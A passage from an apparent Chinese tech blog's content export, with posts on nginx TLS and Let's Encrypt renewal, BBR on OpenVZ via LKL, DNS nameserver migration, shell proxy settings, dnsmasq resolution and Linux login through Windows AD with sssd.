配置 NGINX 的 ssl 参数（optional）cat &lt;&lt;EOF &gt;/etc/nginx/snippets/ssl-params.conf# from https://cipherli.st/# and https://raymii.org/s/tutorials/Strong_SSL_Security_On_nginx.htmlssl_protocols TLSv1 TLSv1.1 TLSv1.2;ssl_prefer_server_ciphers on;ssl_ciphers "EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH";ssl_ecdh_curve secp384r1;ssl_session_cache shared:SSL:10m;ssl_session_tickets off;ssl_stapling on;ssl_stapling_verify on;#resolver 8.8.8.8 8.8.4.4 valid=300s;#resolver_timeout 5s;# Disable preloading HSTS for now.  You can use the commented out header line that includes# the "preload" directive if you understand the implications.#add_header Strict-Transport-Security "max-age=63072000; includeSubdomains; preload";add_header Strict-Transport-Security "max-age=63072000; includeSubdomains";add_header X-Frame-Options DENY;add_header X-Content-Type-Options nosniff;ssl_dhparam /etc/ssl/certs/dhparam.pem;EOF# 如果没有做上一步，最后 ssl_dhparam 那句请注释掉
NGINX 的虚拟机配置vim /etc/nginx/sites-enabled/blog.xiaoyuer.cn;
在 server {} 配置块中添加如下内容：
listen 443 ssl http2 default_server;include snippets/ssl-params.conf;ssl_certificate /etc/letsencrypt/live/blog.xiaoyuer.cn/fullchain.pem;ssl_certificate_key /etc/letsencrypt/live/blog.xiaoyuer.cn/privkey.pem;location ~ /.well-known &#123;	allow all;&#125;
同样的，
vim /etc/nginx/sites-enabled/blog.lukeyang.us;
在 server {} 配置块中添加如下内容：
listen 443 ssl http2;include snippets/ssl-params.conf;ssl_certificate /etc/letsencrypt/live/blog.lukeyang.us/fullchain.pem;ssl_certificate_key /etc/letsencrypt/live/blog.lukeyang.us/privkey.pem;location ~ /.well-known &#123;	allow all;&#125;
注意：
这个配置里的 listen 443 ssl httpd2 一行并没有 default_server 字样，那是一个端口因为只能有一个 default_server，前面那个虚机已经在 443 端口上指定了 default_server，所以这里不能重复指定了
重启 NGINX 服务systemctl restart nginx.service;
配置自动更新证书由于 Let’s Encrypt 的证书会在三个月后过期，但是官方工具提供了自动更新的功能，我们只需要用 cron 定时调用即可。
cat &lt;&lt;EOF &gt;/etc/cron.d/renew_ssl25 3 * * 3 root	/usr/bin/letsencrypt renew&gt;/var/log/le-renew.log"35 3 * * 3 root	/bin/systemctl reload nginxEOF
这里的逻辑是每周（三）检查一次是否需要更新证书，如果需要，则自动更新证书。检查完，再做一次 nginx 的 reload 操作，重新载入新证书（如果有的话）。
参考
How To Secure Nginx with Let’s Encrypt on Ubuntu 16.04

]]></content>
      <tags>
        <tag>https</tag>
        <tag>ssl</tag>
        <tag>http2</tag>
        <tag>NGINX</tag>
        <tag>Ubuntu</tag>
        <tag>letsencrypt</tag>
        <tag>certbot</tag>
      </tags>
  </entry>
  <entry>
    <title>How to enable BBR in OpenVZ</title>
    <url>/2018/10/How-to-enable-BBR-in-OpenVZ/index.html</url>
    <content><![CDATA[缘起以前有个贪便宜（一年 5 刀）而入手但目前在吃灰中的小鸡，当然是 OpenVZ，网络条件很差，用起来很鸡肋，后来看到 Google 的 BBR 也有能用在 OpenVZ 的案例，于是也想尝试下，看是否能将其起死回生。
LKL 大法LKL(Linux Kernel Library) 是个有意思的东西，常见的应用场景是把整个 Linux kernel 编成一个动态库，然后用 LD_PRELOAD 环境变量将其注入到程序运行之前的环境里，强制让程序里的调用时用新编译的这个 kernel 包中的一些函数。
这样其实就已经解决了 OpenVZ 的系统不能升级 kernel 而不能使用 BBR 的问题：我可以把新的支持 BBR 的 kernel 库完全重新编一个，然后用 LD_PRELOAD 注入嘛，完美！
具体命令现在开始贴命令，大段的命令，重要的地方我大概会写点注释
# suppose you are in your home dir: /home/zhangsanwget https://github.com/lkl/linux/archive/master.zipunzip master.zipcd linux-mastermake -C tools/lklsudo su -# act as root blowmkdir haproxyapt-get install haproxysystemctl stop haproxysystemctl disable haproxycd haproxycp \  /home/zhangsan/linux-master/tools/lkl/lib/hijack/liblkl-hijack.so \  .strip liblkl-hijack.so# lkl hijack configuration file below(cat &lt;&lt;'EOF'&#123;       "gateway":"10.0.0.1",       "debug":"1",       "singlecpu":"1",       "sysctl":"net.ipv4.tcp_wmem=4096 65536 67108864",       "sysctl":"net.ipv4.tcp_congestion_control=bbr",       "interfaces":[               &#123;                       "type":"tap",                       "param":"tap0",                       "ip":"10.0.0.2",                       "masklen":"24",                       "ifgateway":"10.0.0.1",                       "offload":"0x8883",                       "qdisc":"root|fq"               &#125;       ]&#125;EOF) &gt; lkl-hijack.json # haproxy configration file below(cat &lt;&lt;'EOF'globaluser haproxygroup haproxydefaultsmode tcptimeout connect 5stimeout client 60stimeout server 60slisten shadowsocksbind 10.0.0.2:443server server1 10.0.0.1:11402EOF) &gt; haproxy.cfg# create start(restart) script file below(cat &lt;&lt;'EOF'#!/bin/bashkillall -9 haproxysleep 5ip tuntap del tap0 mode tapip tuntap add tap0 mode tapip addr add 10.0.0.1/24 dev tap0ip link set tap0 upsysctl -w net.ipv4.ip_forward=1iptables -P FORWARD ACCEPTiptables -t nat -D PREROUTING \  -i venet0 -p tcp --dport 443 \  -j DNAT --to-destination 10.0.0.2iptables -t nat -A PREROUTING \  -i venet0 -p tcp --dport 443 \  -j DNAT --to-destination 10.0.0.2iptables -t nat -D PREROUTING \  -i venet0 -p udp --dport 443 \  -j REDIRECT --to-port 11402iptables -t nat -A PREROUTING \  -i venet0 -p udp --dport 443 \  -j REDIRECT --to-port 11402export LD_PRELOAD=/root/haproxy/liblkl-hijack.sohaproxy -f /root/haproxy/haproxy.cfgEOF) &gt; start_haproxy_lkl.sh
其他本文只提到怎样在 OpenVZ 的虚拟机中启用 BBR，但实际上看上面的配置，应该知道系统里还有个服务，跑在 11402 端口的。这个服务的情况不在本文的内容范畴，所以没有细写。在我的环境里，那是一个酸酸乳(SSR)……不细说了，懂的人自然都懂。
]]></content>
      <tags>
        <tag>OpenVZ</tag>
        <tag>BBR</tag>
        <tag>LKL</tag>
        <tag>Haproxy</tag>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>How to migrate your own NS servers</title>
    <url>/2017/08/How-to-migrate-your-own-NS-servers/index.html</url>
    <content><![CDATA[缘起我厂原来的权威 DNS 服务器放在阿里云上的（三个完全不同的节点每个节点一台），但现在这几个节点要撤了，所以这些个权威 DNS 服务器必须要要迁往别处了。


技术背景DNS架构DNS 的结构管理就像一个倒着的大树，上一级的权威服务器上可以把自己下一级的管理权通过 DNS 纪录里的 NS 纪录（NS 这里是 nameserver 的意思）指派给别的服务器（这个服务器就叫做“权威服务器”）
glue record由于往往会把类似于 xxx.com 这种域的 NS 纪录指向 ns1.xxx.com、ns2.xxx.com 这种纪录，而这种纪录最终指向的 IP 地址，又是需要通过 ns1.xxx.com、ns2.xxx.com 这两台机器来解析，这样就陷入了死循环，为了避免这种问题的发生，.com 和 .net 域出了一种新的策略：所以成为 NS 纪录的域名（类似上面例子中的 ns1.xxx.com 和 ns2.xxx.com），必须先要注册到 Verisign 的库里，也就是说，需要先能在 Verisign 的这里 （点“Name Server”再输入查询）查的到的域名，才能作为某个域的 NS 纪录。Verisign 这个库里的这些纪录，就叫做“glue record”。
至于怎么修改 glue record 或者注册新的 glue record，理论上来讲，需要通过你自己域名的 registrar 的系统。
问题又来了，谁是你的域名的 registrar 呢？一般来讲，如果你没迁移过域名托管的话，那么你在哪里注册的域名，你的 registrar 就是谁，比如 GoDaddy。
这里顺便鄙视一下国内很多 registrar：维护 glue record 需要先续费 5 年，掉钱眼儿里去了吧！
实施步骤情况说明
我司使用的域有好多，但 NS 纪录都是指向的 ns1.xa.com、ns2.xa.com 和 ns3.xa.com。
由于 xa.com 这个域名的 registrar 在国内，需要续费 5 年才能使用 glue record 功能，所以果断另外启用 registrar 在国外的另外一个域名 xb.com 来做 glue record：ns1.xb.com、ns2.xb.com 和 ns3.xb.com。最后 NS 纪录也会用这三个域名

具体步骤原理弄明白了，做起来就要简单有条理很多：

首先是先部署好新的 DNS 服务器（三台），并将域名：ns1.xb.com、ns2.xb.com 和 ns3.xb.com 分别指向新的 DNS 服务器
修改我司域所有 6 台权威服务器的 NS 纪录，加入三条：ns1.xb.com、ns2.xb.com 和 ns3.xb.com；同时在域 xb.com 的 registrar 的系统里加上新的 glue record：ns1.xb.com、ns2.xb.com 和 ns3.xb.com
等 DNS 解析记录收敛的差不多（客户端查 NS 纪录能出所有老的和新的 6 台 DNS 服务器）；这时，在 Verisign 的库里 （点“Name Server”再输入查询）能查询到 ns1.xb.com、ns2.xb.com 和 ns3.xb.com 了
在 registrar （上级）的系统里修改我司域的 NameServer 由 ns1.xa.com、ns2.xa.com 和 ns3.xa.com 到 ns1.xb.com、ns2.xb.com 和 ns3.xb.com
等上级（registrar）里关于我司域的 NameServer 的纪录改为 ns1.xb.com、ns2.xb.com 和 ns3.xb.com 之后
修改我司域所有 6 台权威服务器上的 NS 纪录，删除掉 ns1.xa.com、ns2.xa.com 和 ns3.xa.com 三台，留下 ns1.xb.com、ns2.xb.com 和 ns3.xb.com 三台
在三台老 DNS 服务器的 query log，发现差不多没有请求过来以后，把服务停掉即可。

常见问题
千万不能直接在权威服务器上修改 ns1.xa.com、ns2.xa.com 和 ns3.xa.com 指向新 DNS 服务器

]]></content>
      <tags>
        <tag>DNS</tag>
        <tag>NS</tag>
        <tag>glue record</tag>
        <tag>registrar</tag>
        <tag>registry</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux shell 下使用代理（Proxy）上网的设置方式</title>
    <url>/2018/01/Linux%20shell%20%E4%B8%8B%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%EF%BC%88Proxy%EF%BC%89%E4%B8%8A%E7%BD%91%E7%9A%84%E8%AE%BE%E7%BD%AE%E6%96%B9%E5%BC%8F/index.html</url>
    <content><![CDATA[缘起我厂办公室测试小机房有一些运算资源，但是其网络是不能直接上公网的，而是通过一个内部代理（内部域名是：proxy.xxxdev.com，端口 3128）来上公网的。
但是现在部署环境，多半需要在命令行下折腾，而且还多半需要不停的从公网下东西（安装），所以，怎样在命令行下（shell 里）使用代理来上公网就成了一个绕不开的话题……

具体方案“通用”方案这里的通用之所以打上引号是因为其实这个方案并不通用，因为还是有很多软件不支持，只不过其相对其他来讲还算是相对通用。
Linux Bash 中有环境变量：http_proxy、https_proxy 和 ftp_proxy 等相关变量，都是做 proxy 设置的。
具体用法是：
export http_proxy=http://proxy.xxxdev.com:3218/export https_proxy=http://proxy.xxxdev.com:3218/
这种做法 curl、wget 等命令都是支持的
pear &amp; pecl用 php 的，有时候会用到 pear 和 pecl。虽然这两者查看代理设置的命令是：
pear config-get http_proxy;pcel config-get http_proxy;
但是设置 http_proxy 的命令却都是这一句：
pear config-set http_proxy proxy.xxxdev.com:3128
docker pulldocker 拉取 image 的时候，如果需要代理怎么办呢？如果是 CentOS 7.x 的环境下的话，可以：
mkdir /etc/systemd/system/docker.service.d/;vim /etc/systemd/system/docker.service.d/https-proxy.conf;
写下如下内容：
[Service]Environment="HTTP_PROXY=http://proxy.xxxdev.com:3128/" HTTPS_PROXY=http://proxy.xxxdev.com:3128/"
然后
systemctl daemon-reloadsystemctl restart docker
docker builddocker build image 的时候，也是需要拉东西的，这时也要单独设置 proxy，具体方法在命令行中加入参数 “ –build-arg HTTP_PROXY=http://proxy.xxxdev.com:3128/ ”，于是整个命令就像是这样：
docker build --build-arg HTTP_PROXY=http://proxy.xxxdev.com:3128/ . -t xxx:yyy
结尾暂时就只整理到这么多，以后有新情况再继续更新。
]]></content>
      <tags>
        <tag>Shell</tag>
        <tag>Bash</tag>
        <tag>Proxy</tag>
        <tag>http_proxy</tag>
        <tag>https_proxy</tag>
        <tag>env</tag>
        <tag>export</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 服务器内网域名解析优化方案</title>
    <url>/2017/12/Linux%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E7%BD%91%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/index.html</url>
    <content><![CDATA[缘起这个项目的目的主要是为了解决 Linux服务器在本地解析域名中碰到的几个问题：

nameserver 中一部分有故障（包含宕机了）的问题
nameserver 中一部分性能有问题的问题
有 HA，但有时候服务切换没有期望得那样准确、迅速

主要为了解决以上三个问题，于是有了内网域名解析优化的需求。

现有状况现有情况貌似是每个机房节点有两台 DNS二层服务器（从第一层同步数据），也许配有 HA，也许没配HA，这两台服务器提供本机房内部的服务器的 DNS 查询请求服务。
Dnsmasq 方案原理
Dnsmasq provides Domain Name System (DNS) forwarder, Dynamic Host Configuration Protocol (DHCP) server, router advertisement and network boot features for small computer networks, created as free software.[4][5]
Dnsmasq has low requirements for system resources,[6][7] can run on Linux, BSDs, Android and OS X, and is included in most Linux distributions. Consequently it “is present in a lot of home routers and certain Internet of Things gadgets”[4] and is included in Android.[5]

以上说明来自维基百科。
此方案中用到的主要是一个重要参数：all-servers，这个参数是干嘛用的，请看官方文档的说法：
–all-servers

By default, when dnsmasq has more than one upstream server available,it will send queries to just one server. Setting this flag forcesdnsmasq to send all queries to all available servers. The reply fromthe server which answers first will be returned to the originalrequester.

仔细看，其实这一个参数就已经解决了前面提到的两个问题，他会让 dnsmasq把收到的 DNS 查询请求同时并行发给多个上游 DNS服务器，然后选取最快返回的结果返回给客户端。这样的话，我们只要配置上最够多的上游服务器，那么有几台挂掉，有几台性能不好，这都不是问题，只要有一个足够快返回正确的结果就行了。
当然，前提是服务器的 resolver 得指向 dnsmasq。
服务器配置yum --y install dnsmasq;chkconfig dnsmasq on;cp /etc/resolv.conf&#123;,.`date '+%F'`&#125;;cat &gt;/etc/resolv.conf&lt;&lt;_EOF_search phnamedns.comoptions timeout:1 attempts:1nameserver 127.0.0.1#nameserver x.x.x.x_EOF_
上面的”x.x.x.x”是 Linux 服务器所在机房的二层 DNS内网服务器的内网地址之一，注意：这个内网地址最好在所在机房的二层 DNS服务器的内网地址之间尽量平均分配。
这里为什么要加这么一个 nameserver 纪录呢，这是用来破除 Linux 服务器本地dnsmasq 服务单点的问题的。万一万一本地的 dnsmasq挂掉了，那么在运维人员接到报警上来处理之前，可以通过第二个内网 dns服务器来解析域名。
话又说回来，这个冗余相关的配置可能还是会有些问题，因为我们已将 timeout的时间设成了最小值： 1s，而很有可能 resolver 在尝试从第一个 nameserver解析域名超时之前，客户端程序早就已经超时了。这个时候，设置的第二条nameserver 纪录显然就没用。
Dnsmasq 具体配置cat /etc/dhcsmaws.conf### /etc/dnsmasq.confcp /etc/dnsmasq.conf&#123;,.`date '+%F'`&#125;;cat &gt;/etc/dnsmasq.conf&lt;&lt;_EOF_port=53domain-neededinterface=lolisten-address=127.0.0.1no-dhcp-interface=loall-serversbind-interfacesno-resolvserver=10.0.0.1server=10.0.0.2server=10.0.1.1server=10.0.1.2server=10.0.2.1server=10.0.2.2server=10.0.3.1server=10.0.3.2_EOF_/etc/init.d/dnsmasq start;
优点
dnsmasq 小巧、灵活、配置简单
不用再担心上游某台 DNS 服务器故障
不用关心上游服务器性能差、网络延时大、反应迟钝

缺点
本机的 dnsmasq 服务成为了新的故障点，虽然在 /etc/resolv.conf 中启用第二个 nameserver 来破除了单点，但是由于前面提到的超时原因，dnsmasq 挂还是会导致本机的好多 DNS 解析失败。

前置 LB 设备方案已有 LB 设备如果某个机房里已有现成的 LB 设备，如：F5、NetScaler 等等，或者是已有成熟商业 LB 产品出售的公有云，直接用现成的就好。
没有 LB 设备如果在某个没有负载均衡设备的机房，可以考虑在前端部署一套 LVS；再或者直接用 keepalived 来跑 vrrp 协议，跑两个 VIP，让两台二层 DNS 服务器互为主备，需要解析服务的机房内部服务器，可以直接用着两个 VIP 作为 nameserver。
优点
本方案从基础设施本身入手，不用在客户端（服务器）上改太多东西
实施后本方案也能基本解决目前所碰到的那几个问题

缺点
缺点也很明显，尤其是当需要再重新搭建 LVS 的时候，步骤相对复杂

远期优化方案—解耦从目前来看，无论是 dnsmasq 还是 LB前置方案，都只是目前能做、可以做的，做了就能立马看到效果的优化方案。但我们还得要抬起头来走路，要看到远期，半年后、一年后、几年后……所以我这里连远期的优化改造方案思路也一并提出来，抛砖引玉。
目前，内网解析 DNS 服务器和外网解析 DNS服务器是在一起的，或者说，数据是在一起的，这样很不对，互联网服务讲究独立、不互相依赖，这样的服务才好维护。于是，本着解耦内外网DNS 服务的目的，我觉得远期这两个服务一定要分开！
怎么做？每个机房部署两台或多台 dnsmasq服务（不需要单独服务器）替代现有的二层 DNS 服务器在内网解析中的角色。
现在谈谈可行性、工作量。我发现其实这个工作量其实并不大！很简单，内网 DNS解析服务器其实是并不需要外网权威 DNS服务器那么多的数据的。对于我司完全拥有的域名的解析工作，可以直接走公网；对于由于我司劫持的域名或其他特殊需求，直接在dnsmasq 里转发特定域名解析请求到特定服务器就好了。
备注
本文档所有命令、软件均仅适用于 RHEL 6. 或 CentOS6.，其他平台未经测试。

参考
Dnsmasq 官方文档：http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
/etc/resolv.conf 的官方手册：http://man7.org/linux/man-pages/man5/resolv.conf.5.html

]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>Dnsmasq</tag>
        <tag>resolv.conf</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下域名解析的优化</title>
    <url>/2016/09/Linux%E4%B8%8B%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E7%9A%84%E4%BC%98%E5%8C%96/index.html</url>
    <content><![CDATA[缘起Linux系统下域名解析的配置文件是/etc/resolv.conf，这个大家都知道。估计一般的系统管理员、运维人员都知道在这里面配置上两个或更多的nameserver，以便一个挂掉后还能正常解析域名。但真的情况是这样吗？我从某次故障说起吧，有一次，线上报大量的dns解析失败，上去看，发现是一台nameserver挂掉了，幸好/etc/resolv.conf中的另外一台没有挂，所以，还不是百分百的解析失败。从逻辑上来讲，这些失败的请求应该会去尝试另外一个（好的）nameserver的，但是重试的场景和策略是什么呢？不得而知。所以我就关注了下/etc/resolv.conf文件的配置问题。
下策优化方案之一，就是在/etc/resolv.conf中做优化设置。优化前内容如下：
nameserver 10.0.0.1nameserver 10.0.0.2nameserver 10.0.0.3
优化之后，文件内容变为：
options timeout:1 attempts:1 rotatenameserver 10.0.0.1nameserver 10.0.0.2nameserver 10.0.0.3
这里大概讲下新加的几个选项的含义：

nameserver:dns服务器的ip地址。最多能设三个。
timeout:查询一个nameserver的超时时间，单位是秒。系统缺省是5，最大可以设为30。这他娘不是坑爹吗？那个应用的dns请求会允许这么长的超时时间？早tm超时出错返回了吧。所以我们这里改成最小值：1
attempts:这个是查询的整个都尝试一遍的次数。缺省是2，我觉得在有3台nameserver的前提下，都查询一遍就完全够了（毕竟三台中有一台能正常查出结果的概率是相当大的吧，尤其是nameserver都有监控的说）
rotate:这个参数的含义是随机选取一个作为首选查询的dns server。系统缺省是从上到下的，所以你该了解到为什么缺省情况下第一个nameserver的负载比第三个的大多了吧。

之所以这只是下策，是因为这种解决方案如果碰到有一台nameserver(假如是10.0.0.1)挂掉的情况下，客户端解析请求如果又恰好分到这台nameserver的时候，应用会解析超时失败的概率太高了。
中策中策就是做nameserver的高可用，用lvs来做，做两个vip:10.0.0.4和10.0.0.5，后端real server还是指向这三台真实的nameserver:10.0.0.1、10.0.0.2和10.0.0.3，这样real server的健康状况就由lvs来维护了，这样当客户端来访问vip时，只要后端的3台不都挂掉，就一定能保证返回正确的结果。具体的配置我就不贴了，直接用keepalived来做即可。这个解决方案其实也挺完美的，尤其是当有现成的lvs director的时候。看了最后一策，就知道为什么这个只是中策了。
上策这个方案是我仔细考虑后推荐的方案，尤其适用于没有现成的lvs director的环境里。这个方案的主要特点是：

本机起dnsmasq，监听本地的udp 53口，用来监听来自于本地的解析请求。
在dnsmasq里，将上层服务器定义为10.0.0.1、10.0.0.2和10.0.0.3。

这个方案的优点在于：

本地虽然多起一个dnsmasq服务，但是仅监听127.0.0.1，所以基本不影响性能
dnsmasq会自己维护上游服务器的健康状况，不会把解析请求发到挂掉的上游服务器上

这个方案能够自动做dns server的故障切换，而且不引入任何外部的依赖（dnsmasq是本机跑的），几乎不影响性能，甚至于还有可能提升性能，毕竟，dnsmasq也是会做一级缓存的。所以，我认为其为上策！
]]></content>
      <tags>
        <tag>tuning</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下用户启用Windows AD做集中认证</title>
    <url>/2016/10/Linux%E4%B8%8B%E7%94%A8%E6%88%B7%E5%90%AF%E7%94%A8Windows-AD%E5%81%9A%E9%9B%86%E4%B8%AD%E8%AE%A4%E8%AF%81/index.html</url>
    <content><![CDATA[Why为什么要做服务器的集中认证（和统一权限管理）呢？简答之：当服务器数量呈几何级增长之后，为每台机器维护单独的用户系统已经成为了一个几乎不可能完成的任务（试想下为一万台服务器上的每个用户每三个月修改一次密码），虽然现在也可以通过类似于ansible之类的工具也可以比较容易地做到，但我们有更好的解决方案—-统一认证，这样，只需要在一个地方维护用户数据即可，这样简洁可靠的方案，肯定比ansible之类的方案更胜一筹呀。

How to一句话；用sssd。不过sssd在这两个系统下都能跑，但这里为嘛把CentOS 6.x和7.x的系统分开讲呢？答案简单：由于CentOS 7.x下有realm从而使得配置巨简单而CentOS 6.x下没有realm（也不好编译使用，因为realm其依赖的某个软件包（glib2&gt;=2.36）版本很高，而且那是一个及其重要的核心软件包，CentOS 6.x不好强行升级到这个版本）所以导致两个版本的配置方法不一样。
背景环境
xxx.corp: 是贵司Windows AD上的主域名
AD1.xxx.corp: 是贵司Windows AD上xxx.corp这个域的全局主域控制器
LoginNO: 是贵司AD域xxx.corp中一个组
Daha.Ma: 是贵司AD域xxx.corp中的一个普通用户
SudoNO: 是贵司AD域xxx.corp中一个组
admin.win: 是贵司AD域xxx.corp中的一个具有管理员权限的用户

具体部署CentOS 6.x安装软件yum -y install sssd oddjob oddjob-mkhomedir \	adcli samba-common authconfig;# 下面的"password"是域用户：hiwifi.win的密码echo -n "password" | \	adcli join xxx.corp \	-U admin.win \	--stdin-password;authconfig --enablesssd --enablesssdauth \	--enablemkhomedir --update;service messagebus start;chkconfig messagebus on;# 如果不起oddjobd，用户ssh登录不能自动建立家目录service oddjobd start;chkconfig oddjobd on;# 如果跑的有winbind，disable itservice winbind stop;chkconfig winbind off;
修改配置krb5.confvim /etc/krb5.conf
使得看起来像这样：
[logging] default = FILE:/var/log/krb5libs.log kdc = FILE:/var/log/krb5kdc.log admin_server = FILE:/var/log/kadmind.log[libdefaults] default_realm = xxx.corp dns_lookup_realm = true dns_lookup_kdc = true ticket_lifetime = 24h renew_lifetime = 7d forwardable = true[realms] xxx.corp = &#123;  kdc = AD1.xxx.corp  admin_server = AD1.xxx.corp &#125;[domain_realm] .example.com = xxx.corp example.com = xxx.corp
sssd.confvim /etc/sssd/sssd.conf
修改内容如下：
[sssd]services = nss, pam, ssh, autofsconfig_file_version = 2domains = xxx.corp[domain/xxx.corp]id_provider = adfallback_homedir = /home/%ushell_fallback = /bin/bashoverride_shell = /bin/bashdefault_shell = /bin/bashaccess_provider = simplesimple_allow_groups = LoginNOsimple_allow_users = Daha.Ma
sudoervisudo
添加这么一句：
%SudoNO@xxx.corp   ALL=(ALL)       ALL
现在的情况将是：

除了LoginNO组和Daha.Ma以外其他域账号不能登录
SudoNO组可以不用密码通过sudo执行任何命令

重启服务chmod 600 /etc/sssd/sssd.conf;chown root:root /etc/sssd/sssd.conf;/etc/init.d/sssd restart;
维护命令id Daha.Ma@xxx.corp; # 从AD中获取域用户信息id Daha.Ma; # 在/etc/sssh/sssd.conf中设置了use_fully_qualified_names为False的可以直接用adcli delete-computer --domain=xxx.corp -U admin.win ; # 退出AD域
常见问题不能加入域当前面adcli join xxxxxx时如果出错：

adcli: GSSAPI Error: Unspecified GSS failure. Minor code may provide more information (Server not found in Kerberos database)

的话，请尝试修改/etc/krb5.conf，在[libdefaults]这个区块下加一句：
rdns = false
然后重新再试，即可。
CentOS 7.x安装软件yum -y install \	realmd \	sssd \	oddjob \	krb5-libs \ 	oddjob-mkhomedir \ 	adcli \ 	samba-common;realm join ad1.xxx.corp -U admin.win; # 这里需要输入admin.win的密码realm permit -g LoginNO@xxx.corp; #这里以允许LoginNO组为例
修改配置sudoervisudo
添加这么一句：
%SudoNO@xxx.corp   ALL=(ALL)       ALL
sssd.confvim /etc/sssd/sssd.conf
修改两句如下：
use_fully_qualified_names = Falsefallback_homedir = /home/%u
重启服务systemctl restart sssd;
现在的情况是：

除了LoginNO组以外其他域账号不能登录
SudoNO组有不需要密码通过sudo执行所有命令的权限

维护命令realm permit --withdraw -g LoginNO@xxx.corp; # 取消LoginNO组的登录权限id Daha.Ma@xxx.corp; # 从AD中获取域用户信息id Daha.Ma; # 在/etc/sssh/sssd.conf中设置了use_fully_qualified_names为False的可以直接用realm leave ad1.xxx.corp; # 退出AD域
常见问题sssd不能启动systemctl start sssd
时失败，看 log 文件：/var/log/sssd/sssd_xxx.corp.log 里有错误提示：

[sssd[be[xxx.corp]]] [dp_module_open_lib] (0x0010): Unable to load module [ad] with path [/usr/lib64/sssd/libsss_ad.so]: /lib64/libsamba-credentials.so.0: symbol GSS_KRB5_CRED_NO_CI_FLAGS_X, version gssapi_krb5_2_MIT not defined in file libgssapi_krb5.so.2 with link time reference[sssd[be[xxx.corp]]] [dp_target_init] (0x0010): Unable to load module ad[sssd[be[xxx.corp]]] [be_process_init] (0x0010): Unable to setup data provider [1432158209]: Internal Error[sssd[be[xxx.corp]]] [main] (0x0010): Could not initialize backend [1432158209]

这里的问题是由于一个系统 bug：
samba-client-libs-4.4.4-12.el7_3.x86_64 对 krb5-libs 的依赖关系没正确设置导致的。
具体：

sssd 包调用 sssd-ad 包来做跟 windows AD 之间的沟通
sssd-ad 依赖于包 samba-client-libs
samba-client-libs 又依赖于 krb5-libs
由于samba-client-libs 对 krb5-libs 的依赖关系不对，导致 yum install sssd 的时候没有升级正确的 krb5-libs 包，所以导致 sssd 起不来

解决方法很简单，前面安装的那部分已经实现了，就是将 krb5-libs 写进 yum install 的包列表里，这样就会强制安装（升级）到最新的 krb5-libs
相关链接
Configuring sssd to authenticate with a Windows 2008 or later Domain Server

]]></content>
      <tags>
        <tag>AD</tag>
        <tag>ldap</tag>
        <tag>sssd</tag>
        <tag>realm</tag>
        <tag>adcli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux域名解析中的IP地址选择“亲和性”问题</title>
    <url>/2017/07/Linux%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E4%B8%AD%E7%9A%84IP%E5%9C%B0%E5%9D%80%E9%80%89%E6%8B%A9%E2%80%9C%E4%BA%B2%E5%92%8C%E6%80%A7%E2%80%9D%E9%97%AE%E9%A2%98/index.html</url>
    <content><![CDATA[问题初现最早发现问题时是在做一个测试，把某个域名解析到内网的几台机器上（10.0.0.9 和 10.0.0.119），结果用客户端（10.0.0.200 和 10.0.0.201，都由于特殊原因没有关掉 IPv6）去连接测试时发现，连接都跑到 10.0.0.119 上了，10.0.0.9 上几乎没有连接！

问题原因网上 Google 了一下，据说是新的域名解析系统调用 getaddrinfo() 加入了对 rfc3484 的支持导致的，这种支持会将 DNS 服务器返回某个域名的多个 IP（顺序随机），按照一定的逻辑排序后再返回，这样的话由于客户端一般都会取第一个 IP，所以我们看到的结果就是某个客户端老连一个 IP。
至于 rfc3484 中涉及到的排序逻辑，我的理解大概是优先返回跟客户端“最近”的 IP 地址（具体算法肯定远比这个复杂，但大概就是这个意思，所以我把 rfc3484 引入的这个问题称之为“亲和性”问题）。
我们的客户端的 IP 是 10.0.0.200 和 10.0.0.201，显然离 10.0.0.119 比离 10.0.0.9 更“近”，所以，连接都跑 10.0.0.119 上去了，10.0.0.9 上几乎没有连接。
解决方法
强制使用老系统调用：gethostbyname
系统里干掉 IPv6

当然是第二种方法合适，因为这样我们不用动代码，而只需要配置下环境即可。
测试求证本着打破沙锅问到底的精神，找了个简单程序调用 getaddrinfo，并跟进 glibc 的源代码里看到了 getaddrinfo 函数执行情况的细节。于是找了两台服务器（用作客户端）：

10.0.0.3（IPv6 enabled）
10.0.0.233（IPv6 disabled）

在这两台机器上分别跑 gai.c 编出来的二进制文件，发现 IPv6 启用的那台（10.0.0.3）域名解析始终首先返回 10.0.0.9，而 IPv6 disabled 的那台（10.0.0.233）却一会儿首先返回 10.0.0.119，一会儿又首先返回 10.0.0.9。
附录例程getaddrinfo.c这个例程是网上翻出来的，连文件名、版权注释都没改。：）
/* * getaddrinfo.c - Simple example of using getaddrinfo(3) function. * * Michal Ludvig &lt;michal@logix.cz&gt; (c) 2002, 2003 * http://www.logix.cz/michal/devel/ * * License: public domain. */#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;netdb.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;	intlookup_host (const char *host)&#123;	struct addrinfo hints, *res;	int errcode;	char addrstr[100];	void *ptr;	memset (&amp;hints, 0, sizeof (hints));	hints.ai_family = PF_UNSPEC;	hints.ai_socktype = SOCK_STREAM;	hints.ai_flags |= AI_CANONNAME;	errcode = getaddrinfo (host, NULL, &amp;hints, &amp;res);	if (errcode != 0)	&#123;		perror ("getaddrinfo");		return -1;	&#125;	printf ("Host: %s\n", host);	while (res)	&#123;		inet_ntop (res-&gt;ai_family, res-&gt;ai_addr-&gt;sa_data, addrstr, 100);		switch (res-&gt;ai_family)		&#123;			case AF_INET:				ptr = &amp;((struct sockaddr_in *) res-&gt;ai_addr)-&gt;sin_addr;				break;			case AF_INET6:				ptr = &amp;((struct sockaddr_in6 *) res-&gt;ai_addr)-&gt;sin6_addr;				break;		